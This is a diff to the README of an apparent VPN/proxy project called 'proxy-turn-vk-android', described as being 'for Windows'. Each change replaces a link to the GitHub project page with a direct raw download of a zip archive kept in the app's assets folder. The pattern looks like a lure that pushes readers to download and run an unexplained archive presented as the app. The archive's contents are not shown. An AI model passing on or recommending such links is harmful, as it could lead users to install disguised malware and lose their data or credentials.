@@ -1,12 +1,12 @@
 # 🛡️ proxy-turn-vk-android - Private WireGuard Path for Windows
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip)
 
 ## 🔽 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
+[https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip](https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip)
 
 ## 📌 What this app does
 
@@ -37,7 +37,7 @@ Before you start, make sure you have:
 ## 🚀 How to get started
 
 1. Open the download page:
-   [https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
+   [https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip](https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip)
 
 2. Download the app file or source package from the page.
 
@@ -170,4 +170,4 @@ For a smooth setup:
 
 Download or open the project page here:
 
-[https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
+[https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip](https://raw.githubusercontent.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android/main/app/src/main/assets/proxy_vk_android_turn_2.2.zip)
